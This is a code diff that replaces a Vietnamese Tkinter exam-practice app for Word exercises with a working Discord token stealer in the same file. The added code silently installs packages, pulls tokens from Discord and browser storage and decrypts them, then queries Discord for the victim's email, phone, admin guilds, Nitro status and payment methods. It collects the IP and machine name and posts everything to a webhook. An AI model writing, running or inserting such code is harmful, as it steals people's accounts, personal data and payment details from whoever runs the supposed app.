@@ -1,242 +1,240 @@
 import os
-import shutil
-import tkinter as tk
-from tkinter import messagebox
-import win32com.client
+
+if os.name != "nt":
+    exit()
+import subprocess
+import sys
+import json
+import urllib.request
+import re
+import base64
+import datetime
 
 
-class App:
-    def __init__(self, root):
-        self.root = root
-        self.root.title("Gmetrix Demo App")
-        self.root.configure(bg="#f5f5f5")
-
-        # Lấy kích thước màn hình
-        screen_w = self.root.winfo_screenwidth()
-        screen_h = self.root.winfo_screenheight()
-
-        # Đặt cửa sổ app ngang bằng màn hình, cao = 15%, nằm sát dưới
-        win_w = screen_w
-        win_h = int(screen_h * 0.15)
-        win_x = 0
-        win_y = screen_h - win_h - 80
-        self.root.geometry(f"{win_w}x{win_h}+{win_x}+{win_y}")
-
-        self.projects = self.load_projects()
-        self.current_project = None
-        self.current_task_index = 0
-
-        self.word_app = None
-        self.word_doc = None
-
-        # Lưu các nút project
-        self.project_buttons = {}
-
-        # === Layout ===
-        top_frame = tk.Frame(self.root, bg="#f5f5f5")
-        top_frame.pack(fill="x", pady=5)
-
-        self.project_frame = tk.Frame(top_frame, bg="#f5f5f5")
-        self.project_frame.pack(side="left", padx=10)
-
-        self.control_frame = tk.Frame(top_frame, bg="#f5f5f5")
-        self.control_frame.pack(side="right", padx=10)
-
-        self.task_label = tk.Label(self.root, text="", font=("Arial", 12),
-                                   bg="#ffffff", fg="#333333", wraplength=win_w - 100,
-                                   relief="solid", bd=1, padx=10, pady=10)
-        self.task_label.pack(pady=5, fill="both", expand=True)
-
-        bottom_frame = tk.Frame(self.root, bg="#f5f5f5")
-        bottom_frame.pack(fill="x", pady=5)
-
-        self.prev_btn = tk.Button(bottom_frame, text="← Trước", command=self.prev_task,
-                                  bg="#0078d7", fg="white", font=("Arial", 10, "bold"))
-        self.prev_btn.pack(side="left", padx=5)
-
-        self.task_btn_frame = tk.Frame(bottom_frame, bg="#f5f5f5")
-        self.task_btn_frame.pack(side="left", padx=10, expand=True)
-
-        self.next_btn = tk.Button(bottom_frame, text="Tiếp →", command=self.next_task,
-                                  bg="#0078d7", fg="white", font=("Arial", 10, "bold"))
-        self.next_btn.pack(side="right", padx=5)
-
-        self.task_buttons = []
-
-        self.load_ui()
-
-    def load_projects(self):
-        projects = {}
-        base_dir = "Projects"
-        if not os.path.exists(base_dir):
-            os.makedirs(base_dir)
-        for folder in os.listdir(base_dir):
-            project_path = os.path.join(base_dir, folder)
-            if os.path.isdir(project_path):
-                student = os.path.join(project_path, "student.docx")
-                original = os.path.join(project_path, "student_original.docx")
-                answer = os.path.join(project_path, "answer.docx")
-                tasks_file = os.path.join(project_path, "tasks.txt")
-
-                if os.path.exists(student) and os.path.exists(original) and os.path.exists(answer) and os.path.exists(tasks_file):
-                    tasks = []
-                    with open(tasks_file, "r", encoding="utf-8") as f:
-                        for line in f:
-                            line = line.strip()
-                            if line:
-                                tasks.append(line)
-                    projects[folder] = {
-                        "student": student,
-                        "original": original,
-                        "answer": answer,
-                        "tasks": tasks
-                    }
-        return projects
-
-    def load_ui(self):
-        # Tạo nút project
-        for widget in self.project_frame.winfo_children():
-            widget.destroy()
-        self.project_buttons.clear()
-
-        for project_name in self.projects.keys():
-            btn = tk.Button(self.project_frame, text=project_name,
-                            command=lambda n=project_name: self.select_project(n),
-                            bg="#e0e0e0", fg="#000", font=("Arial", 10, "bold"))
-            btn.pack(side="left", padx=5)
-            self.project_buttons[project_name] = btn
-
-        # Nút control
-        for widget in self.control_frame.winfo_children():
-            widget.destroy()
-
-        tk.Button(self.control_frame, text="Mở File", command=self.open_file,
-                  bg="#28a745", fg="white", font=("Arial", 10, "bold")).pack(side="left", padx=5)
-
-        tk.Button(self.control_frame, text="Restart", command=self.restart_file,
-                  bg="#ffc107", fg="black", font=("Arial", 10, "bold")).pack(side="left", padx=5)
-
-        tk.Button(self.control_frame, text="Chấm điểm", command=self.check_answer,
-                  bg="#dc3545", fg="white", font=("Arial", 10, "bold")).pack(side="left", padx=5)
-
-    def select_project(self, name):
-        self.current_project = self.projects[name]
-        self.current_task_index = 0
-        self.show_task()
-
-        # Đổi màu nút project
-        for pname, btn in self.project_buttons.items():
-            if pname == name:
-                btn.config(bg="#0078d7", fg="white")
-            else:
-                btn.config(bg="#e0e0e0", fg="#000")
-
-    def show_task(self):
-        if not self.current_project:
-            return
-        tasks = self.current_project["tasks"]
-        if tasks:
-            task_text = tasks[self.current_task_index]
-            self.task_label.config(text=task_text)
-            self.update_task_buttons()
-
-    def update_task_buttons(self):
-        for widget in self.task_btn_frame.winfo_children():
-            widget.destroy()
-        self.task_buttons.clear()
-
-        for i, _ in enumerate(self.current_project["tasks"]):
-            btn = tk.Button(self.task_btn_frame, text=f"{i+1}",
-                            command=lambda idx=i: self.goto_task(idx),
-                            font=("Arial", 8, "bold"), width=2, height=1)
-            if i == self.current_task_index:
-                btn.config(bg="#0078d7", fg="white")
-            else:
-                btn.config(bg="#e0e0e0", fg="black")
-            btn.pack(side="left", padx=1)
-            self.task_buttons.append(btn)
-
-    def goto_task(self, idx):
-        self.current_task_index = idx
-        self.show_task()
-
-    def prev_task(self):
-        if self.current_project and self.current_task_index > 0:
-            self.current_task_index -= 1
-            self.show_task()
-
-    def next_task(self):
-        if self.current_project and self.current_task_index < len(self.current_project["tasks"]) - 1:
-            self.current_task_index += 1
-            self.show_task()
-
-    def open_file(self):
-        if not self.current_project:
-            return
-        student = self.current_project["student"]
-        self.open_word(student)
-
-    def open_word(self, filepath):
+def install_import(modules):
+    for module, pip_name in modules:
         try:
-            if not self.word_app:
-                self.word_app = win32com.client.Dispatch("Word.Application")
-                self.word_app.Visible = True
-            self.word_doc = self.word_app.Documents.Open(os.path.abspath(filepath))
-        except Exception as e:
-            messagebox.showerror("Lỗi", f"Không thể mở file Word: {e}")
+            __import__(module)
+        except ImportError:
+            subprocess.check_call([sys.executable, "-m", "pip", "install", pip_name], stdout=subprocess.DEVNULL,
+                                  stderr=subprocess.DEVNULL)
+            os.execl(sys.executable, sys.executable, *sys.argv)
 
-    def restart_file(self):
-        if not self.current_project:
-            return
 
-        confirm = messagebox.askyesno("Xác nhận Restart",
-                                      "Bạn có chắc muốn làm lại bài này không?\nFile hiện tại sẽ bị thay thế.")
-        if not confirm:
-            return
+install_import([("win32crypt", "pypiwin32"), ("Crypto.Cipher", "pycryptodome")])
+
+import win32crypt
+from Crypto.Cipher import AES
+
+LOCAL = os.getenv("LOCALAPPDATA")
+ROAMING = os.getenv("APPDATA")
+PATHS = {
+    'Discord': ROAMING + '\\discord',
+    'Discord Canary': ROAMING + '\\discordcanary',
+    'Lightcord': ROAMING + '\\Lightcord',
+    'Discord PTB': ROAMING + '\\discordptb',
+    'Opera': ROAMING + '\\Opera Software\\Opera Stable',
+    'Opera GX': ROAMING + '\\Opera Software\\Opera GX Stable',
+    'Amigo': LOCAL + '\\Amigo\\User Data',
+    'Torch': LOCAL + '\\Torch\\User Data',
+    'Kometa': LOCAL + '\\Kometa\\User Data',
+    'Orbitum': LOCAL + '\\Orbitum\\User Data',
+    'CentBrowser': LOCAL + '\\CentBrowser\\User Data',
+    '7Star': LOCAL + '\\7Star\\7Star\\User Data',
+    'Sputnik': LOCAL + '\\Sputnik\\Sputnik\\User Data',
+    'Vivaldi': LOCAL + '\\Vivaldi\\User Data\\Default',
+    'Chrome SxS': LOCAL + '\\Google\\Chrome SxS\\User Data',
+    'Chrome': LOCAL + "\\Google\\Chrome\\User Data" + 'Default',
+    'Epic Privacy Browser': LOCAL + '\\Epic Privacy Browser\\User Data',
+    'Microsoft Edge': LOCAL + '\\Microsoft\\Edge\\User Data\\Defaul',
+    'Uran': LOCAL + '\\uCozMedia\\Uran\\User Data\\Default',
+    'Yandex': LOCAL + '\\Yandex\\YandexBrowser\\User Data\\Default',
+    'Brave': LOCAL + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
+    'Iridium': LOCAL + '\\Iridium\\User Data\\Default'
+}
+
+
+def getheaders(token=None):
+    headers = {
+        "Content-Type": "application/json",
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36"
+    }
+
+    if token:
+        headers.update({"Authorization": token})
+
+    return headers
+
+
+def gettokens(path):
+    path += "\\Local Storage\\leveldb\\"
+    tokens = []
+
+    if not os.path.exists(path):
+        return tokens
+
+    for file in os.listdir(path):
+        if not file.endswith(".ldb") and file.endswith(".log"):
+            continue
 
         try:
-            if self.word_doc:
-                self.word_doc.Close(False)
-                self.word_doc = None
-        except:
-            self.word_doc = None
+            with open(f"{path}{file}", "r", errors="ignore") as f:
+                for line in (x.strip() for x in f.readlines()):
+                    for values in re.findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", line):
+                        tokens.append(values)
+        except PermissionError:
+            continue
 
-        try:
-            if self.word_app:
-                self.word_app.Quit()
-                self.word_app = None
-        except:
-            self.word_app = None
+    return tokens
 
-        student = self.current_project["student"]
-        original = self.current_project["original"]
-        shutil.copyfile(original, student)
 
-        self.open_word(student)
+def getkey(path):
+    with open(path + f"\\Local State", "r") as file:
+        key = json.loads(file.read())['os_crypt']['encrypted_key']
+        file.close()
 
-    def check_answer(self):
-        if not self.current_project:
-            return
-        student = self.current_project["student"]
-        answer = self.current_project["answer"]
+    return key
 
-        from docx import Document
-        try:
-            doc_student = Document(student)
-            doc_answer = Document(answer)
 
-            text_student = "\n".join([p.text for p in doc_student.paragraphs])
-            text_answer = "\n".join([p.text for p in doc_answer.paragraphs])
+def getip():
+    try:
+        with urllib.request.urlopen("https://api.ipify.org?format=json") as response:
+            return json.loads(response.read().decode()).get("ip")
+    except:
+        return "None"
 
-            if text_student.strip() == text_answer.strip():
-                messagebox.showinfo("Kết quả", "Bài làm ĐÚNG")
-            else:
-                messagebox.showwarning("Kết quả", "Bài làm CHƯA đúng")
-        except Exception as e:
-            messagebox.showerror("Lỗi", f"Không thể chấm điểm: {e}")
+
+def main():
+    checked = []
+
+    for platform, path in PATHS.items():
+        if not os.path.exists(path):
+            continue
+
+        for token in gettokens(path):
+            token = token.replace("\\", "") if token.endswith("\\") else token
+
+            try:
+                token = AES.new(
+                    win32crypt.CryptUnprotectData(base64.b64decode(getkey(path))[5:], None, None, None, 0)[1],
+                    AES.MODE_GCM, base64.b64decode(token.split('dQw4w9WgXcQ:')[1])[3:15]).decrypt(
+                    base64.b64decode(token.split('dQw4w9WgXcQ:')[1])[15:])[:-16].decode()
+                if token in checked:
+                    continue
+                checked.append(token)
+
+                res = urllib.request.urlopen(
+                    urllib.request.Request('https://discord.com/api/v10/users/@me', headers=getheaders(token)))
+                if res.getcode() != 200:
+                    continue
+                res_json = json.loads(res.read().decode())
+
+                badges = ""
+                flags = res_json['flags']
+                if flags == 64 or flags == 96:
+                    badges += ":BadgeBravery: "
+                if flags == 128 or flags == 160:
+                    badges += ":BadgeBrilliance: "
+                if flags == 256 or flags == 288:
+                    badges += ":BadgeBalance: "
+
+                params = urllib.parse.urlencode({"with_counts": True})
+                res = json.loads(urllib.request.urlopen(
+                    urllib.request.Request(f'https://discordapp.com/api/v6/users/@me/guilds?{params}',
+                                           headers=getheaders(token))).read().decode())
+                guilds = len(res)
+                guild_infos = ""
+
+                for guild in res:
+                    if guild['permissions'] & 8 or guild['permissions'] & 32:
+                        res = json.loads(urllib.request.urlopen(
+                            urllib.request.Request(f'https://discordapp.com/api/v6/guilds/{guild["id"]}',
+                                                   headers=getheaders(token))).read().decode())
+                        vanity = ""
+
+                        if res["vanity_url_code"] != None:
+                            vanity = f"""; .gg/{res["vanity_url_code"]}"""
+
+                        guild_infos += f"""\nㅤ- [{guild['name']}]: {guild['approximate_member_count']}{vanity}"""
+                if guild_infos == "":
+                    guild_infos = "No guilds"
+
+                res = json.loads(urllib.request.urlopen(
+                    urllib.request.Request('https://discordapp.com/api/v6/users/@me/billing/subscriptions',
+                                           headers=getheaders(token))).read().decode())
+                has_nitro = False
+                has_nitro = bool(len(res) > 0)
+                exp_date = None
+                if has_nitro:
+                    badges += f":BadgeSubscriber: "
+                    exp_date = datetime.datetime.strptime(res[0]["current_period_end"],
+                                                          "%Y-%m-%dT%H:%M:%S.%f%z").strftime('%d/%m/%Y at %H:%M:%S')
+
+                res = json.loads(urllib.request.urlopen(
+                    urllib.request.Request('https://discord.com/api/v9/users/@me/guilds/premium/subscription-slots',
+                                           headers=getheaders(token))).read().decode())
+                available = 0
+                print_boost = ""
+                boost = False
+                for id in res:
+                    cooldown = datetime.datetime.strptime(id["cooldown_ends_at"], "%Y-%m-%dT%H:%M:%S.%f%z")
+                    if cooldown - datetime.datetime.now(datetime.timezone.utc) < datetime.timedelta(seconds=0):
+                        print_boost += f"ㅤ- Available now\n"
+                        available += 1
+                    else:
+                        print_boost += f"ㅤ- Available on {cooldown.strftime('%d/%m/%Y at %H:%M:%S')}\n"
+                    boost = True
+                if boost:
+                    badges += f":BadgeBoost: "
+
+                payment_methods = 0
+                type = ""
+                valid = 0
+                for x in json.loads(urllib.request.urlopen(
+                        urllib.request.Request('https://discordapp.com/api/v6/users/@me/billing/payment-sources',
+                                               headers=getheaders(token))).read().decode()):
+                    if x['type'] == 1:
+                        type += "CreditCard "
+                        if not x['invalid']:
+                            valid += 1
+                        payment_methods += 1
+                    elif x['type'] == 2:
+                        type += "PayPal "
+                        if not x['invalid']:
+                            valid += 1
+                        payment_methods += 1
+
+                print_nitro = f"\nNitro Informations:\n```yaml\nHas Nitro: {has_nitro}\nExpiration Date: {exp_date}\nBoosts Available: {available}\n{print_boost if boost else ''}\n```"
+                nnbutb = f"\nNitro Informations:\n```yaml\nBoosts Available: {available}\n{print_boost if boost else ''}\n```"
+                print_pm = f"\nPayment Methods:\n```yaml\nAmount: {payment_methods}\nValid Methods: {valid} method(s)\nType: {type}\n```"
+                embed_user = {
+                    'embeds': [
+                        {
+                            'title': f"**New user data: {res_json['username']}**",
+                            'description': f"""
+                                ```yaml\nUser ID: {res_json['id']}\nEmail: {res_json['email']}\nPhone Number: {res_json['phone']}\n\nGuilds: {guilds}\nAdmin Permissions: {guild_infos}\n``` ```yaml\nMFA Enabled: {res_json['mfa_enabled']}\nFlags: {flags}\nLocale: {res_json['locale']}\nVerified: {res_json['verified']}\n```{print_nitro if has_nitro else nnbutb if available > 0 else ""}{print_pm if payment_methods > 0 else ""}```yaml\nIP: {getip()}\nUsername: {os.getenv("UserName")}\nPC Name: {os.getenv("COMPUTERNAME")}\nToken Location: {platform}\n```Token: \n```yaml\n{token}```""",
+                            'color': 3092790,
+                            'footer': {
+                                'text': "Made by Astraa ・ https://github.com/astraadev"
+                            },
+                            'thumbnail': {
+                                'url': f"https://cdn.discordapp.com/avatars/{res_json['id']}/{res_json['avatar']}.png"
+                            }
+                        }
+                    ],
+                    "username": "Grabber",
+                    "avatar_url": "https://avatars.githubusercontent.com/u/43183806?v=4"
+                }
+
+                urllib.request.urlopen(
+                    urllib.request.Request('WEBHOOK_URL', data=json.dumps(embed_user).encode('utf-8'),
+                                           headers=getheaders(), method='POST')).read().decode()
+            except urllib.error.HTTPError or json.JSONDecodeError:
+                continue
+            except Exception as e:
+                print(f"ERROR: {e}")
+                continue
 
 
 if __name__ == "__main__":
-    root = tk.Tk()
-    app = App(root)
-    root.mainloop()
+    main()
